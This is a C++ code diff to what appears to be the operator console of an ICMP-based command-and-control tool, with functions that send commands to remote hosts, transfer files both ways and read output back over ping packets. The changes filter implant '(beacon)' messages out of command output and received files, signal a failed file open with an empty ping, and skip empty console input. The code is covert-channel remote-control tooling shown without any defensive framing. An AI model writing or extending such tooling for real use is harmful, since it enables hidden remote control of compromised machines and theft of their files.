@@ -273,6 +273,7 @@ void send_command(const std::string &dst, const std::string &command)
   while (1)
   {
     uint8_t in[512];
+    
     // receive a ping and store the ip addres
     std::string src_ip;
     ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
@@ -282,10 +283,17 @@ void send_command(const std::string &dst, const std::string &command)
 
     if (num_bytes > 0)
     {
-      // put command ouput to stdout
+
       char *str_ = (char *)in;
       std::string str(str_, num_bytes);
-      std::fputs(str.c_str(), stdout);
+
+      // only store hostname into active connections list if a beacon is sent
+      auto split = split_input(str);
+      if (split.at(0).compare("(beacon)") != 0)
+      {
+        // put command ouput to stdout
+        std::fputs(str.c_str(), stdout);
+      }
     }
     else
     {
@@ -324,6 +332,7 @@ void send_file(const std::string &dst, const std::string &src_file, const std::s
   if (fp == NULL)
   {
     perror("fopen");
+    send_ping(sockfd, dst, NULL, 0);
     return;
   }
 
@@ -382,7 +391,16 @@ void receive_file(const std::string &dst, const std::string &src_file, const std
 
     if (num_bytes > 0)
     {
-      fwrite(in, 1, num_bytes, fp);
+      char *str_ = (char *)in;
+      std::string str(str_, num_bytes);
+
+      // only store hostname into active connections list if a beacon is sent
+      auto split = split_input(str);
+      if (split.at(0).compare("(beacon)") != 0)
+      {
+        // put command ouput to stdout
+        fwrite(in, 1, num_bytes, fp);
+      }
     }
     else
     {
@@ -501,6 +519,10 @@ int main(int argc, char **argv)
     std::string input;
     std::cout << "> ";
     std::getline(std::cin, input);
+
+    if (input.empty()) {
+      continue;
+    }
 
     // split input by spaces and save into an vector
     auto input_arr = split_input(input);
